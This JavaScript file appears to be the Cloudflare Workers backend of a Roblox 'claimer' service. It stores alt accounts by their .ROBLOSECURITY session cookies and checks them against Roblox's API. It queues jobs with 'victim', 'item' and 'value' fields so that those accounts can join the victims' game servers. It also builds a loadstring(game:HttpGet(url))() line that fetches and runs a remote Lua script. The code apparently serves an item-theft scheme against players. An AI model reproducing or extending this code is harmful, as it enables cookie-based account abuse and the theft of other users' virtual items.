// The Workers build keeps the queue, accounts and status surface, but has no
// desktop engine: joins are handed to the always-on device running the Lua
// claimer, which polls /api/claimer/target with the account API key.

const JOIN_GAP_MS = 25_000;
const JOB_TTL_MS = 8 * 60_000;
const LEASE_MS = 90_000;
const MAX_ACCOUNTS = 5;
const MAX_JOBS = 60;

const clean = (v, n) => String(v ?? '').replace(/[<>\r\n]/g, '').trim().slice(0, n);

export const normalizeCookie = (raw) => {
  const c = String(raw ?? '').trim().replace(/^\.?ROBLOSECURITY=/i, '').trim().replace(/^"|"$/g, '');
  if (!c) return '';
  if (c.startsWith('_|')) return c;
  if (c.startsWith('WARNING')) return `_|${c}`;
  return c;
};

export const cookieValid = (c) => typeof c === 'string' && c.startsWith('_|') && c.length >= 80;

export const maskCookie = (c) => (c ? `_|••••${c.slice(-6)}` : null);

export async function verifyCookie(cookie) {
  if (!cookieValid(cookie)) return { ok: false, error: 'That does not look like a .ROBLOSECURITY value.' };
  const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
    headers: { cookie: `.ROBLOSECURITY=${cookie}`, 'user-agent': 'Roblox/WinInet' },
  }).catch((err) => ({ ok: false, status: 0, json: async () => ({ message: err.message }) }));
  if (!res.ok) {
    const body = await res.json().catch(() => ({}));
    return {
      ok: false,
      error: res.status === 401
        ? 'Roblox rejected this cookie.'
        : (body?.errors?.[0]?.message ?? body?.message ?? `HTTP ${res.status || 'error'}`),
    };
  }
  const body = await res.json().catch(() => ({}));
  return { ok: true, username: body?.name ?? 'unknown', display: body?.displayName ?? body?.name, id: body?.id };
}

export function createClaimer({ store, scriptUrlFor = () => null, apiInfoFor = () => null, runtimeFor = () => null, hitsFor = () => [] }) {
  const state = { running: false, busy: false, lastTick: null, lastJoin: null, lastError: null };

  const accountsOf = (user) => user.claimer?.accounts ?? [];

  const expire = (user) => {
    const now = Date.now();
    for (const job of store.claims(user.id)) {
      if (job.status === 'queued' && job.created_at < now - JOB_TTL_MS) {
        store.updateClaim(job.id, { status: 'expired', finished_at: now, error: 'server window elapsed' });
      } else if (job.status === 'joining' && (job.assigned_at ?? job.started_at ?? job.created_at) < now - LEASE_MS) {
        store.updateClaim(job.id, { status: 'queued', account_id: null, account_name: null, assigned_at: null });
      }
    }
  };

  function status(user) {
    const cfg = user.claimer ?? {};
    const jobs = store.claims(user.id).slice(0, 25);
    const today = new Date().setHours(0, 0, 0, 0);
    const url = scriptUrlFor(user);
    return {
      enabled: Boolean(cfg.enabled),
      auto_join: cfg.auto_join !== false,
      auto_arm: cfg.auto_arm === true,
      engine_enabled: false,
      cloud: true,
      script: { url, loadstring: url ? `loadstring(game:HttpGet("${url}"))()` : null },
      api: apiInfoFor(user),
      runtime: runtimeFor(user),
      hits: hitsFor(user),
      autoexec: false,
      autoexec_path: null,
      detected_paths: [],
      min_value: Number(cfg.min_value) || 0,
      accounts: accountsOf(user).map((a) => ({
        id: a.id,
        username: a.username,
        status: a.status,
        cookie_mask: maskCookie(a.cookie),
        added_at: a.added_at,
        last_join: a.last_join ?? null,
        last_error: a.last_error ?? null,
      })),
      jobs,
      queue: {
        queued: store.claims(user.id).filter((j) => j.status === 'queued').length,
        joined_today: store.claims(user.id).filter((j) => j.status === 'joined' && (j.finished_at ?? 0) >= today).length,
        failed: store.claims(user.id).filter((j) => j.status === 'failed').length,
        total: store.claims(user.id).length,
      },
      engine: {
        running: false,
        busy: false,
        dry_run: false,
        platform: 'cloudflare',
        last_tick: state.lastTick,
        last_join: state.lastJoin,
        last_error: state.lastError,
        join_gap_ms: JOIN_GAP_MS,
        accounts_limit: MAX_ACCOUNTS,
        max_jobs: MAX_JOBS,
      },
    };
  }

  function addAccount(user, { cookie, username }) {
    user.claimer ??= {};
    user.claimer.accounts ??= [];
    if (user.claimer.accounts.length >= MAX_ACCOUNTS) {
      return { ok: false, error: `You can add up to ${MAX_ACCOUNTS} claimer accounts.` };
    }
    const account = {
      id: crypto.randomUUID(),
      cookie,
      username: clean(username, 40).toLowerCase() || 'unverified',
      status: 'unverified',
      added_at: Date.now(),
      last_join: null,
      last_error: null,
    };
    user.claimer.accounts.push(account);
    store.saveUser(user);
    return { ok: true, account };
  }

  function queueClaim(user, job, { force = false } = {}) {
    const cfg = user.claimer ?? {};
    if (!force && !cfg.enabled && cfg.auto_join === false && !(cfg.accounts?.length ?? 0)) return null;
    const recent = store.claims(user.id).find((j) => j.server_id === job.server_id
      && j.place_id === job.place_id
      && j.created_at > Date.now() - 5 * 60_000
      && ['queued', 'joining', 'joined'].includes(j.status));
    if (recent) return null;
    if (store.claims(user.id).length >= MAX_JOBS) store.trimClaims(user.id, MAX_JOBS);

    const claim = {
      id: crypto.randomUUID(),
      user_id: user.id,
      game: job.game,
      item: job.item,
      victim: job.victim,
      value: job.value,
      place_id: job.place_id,
      server_id: job.server_id,
      requester: job.roblox_user ?? null,
      executor: job.executor ?? null,
      status: 'queued',
      attempts: 0,
      account_id: null,
      account_name: null,
      error: null,
      created_at: Date.now(),
      started_at: null,
      finished_at: null,
    };
    store.addClaim(claim);
    return claim;
  }

  // no local Roblox client in the cloud: hand the job to the polling device
  async function joinNow(user, jobId) {
    const job = store.claims(user.id).find((j) => j.id === jobId);
    if (!job) return { ok: false, error: 'That target is gone.' };
    if (job.status === 'joined') return { ok: false, error: 'Already joined that server.' };
    store.updateClaim(job.id, {
      status: 'queued',
      error: null,
      assigned_at: null,
      account_id: null,
      account_name: null,
      created_at: Date.now(),
    });
    state.lastJoin = { at: Date.now(), server_id: job.server_id, account: 'lua', manual: true };
    return { ok: true, queued: true };
  }

  return {
    start: () => {},
    stop: () => {},
    tick: async () => {},
    joinNow,
    status,
    addAccount,
    queueClaim,
    reap: expire,
    maxAccounts: MAX_ACCOUNTS,
    leaseMs: LEASE_MS,
  };
}
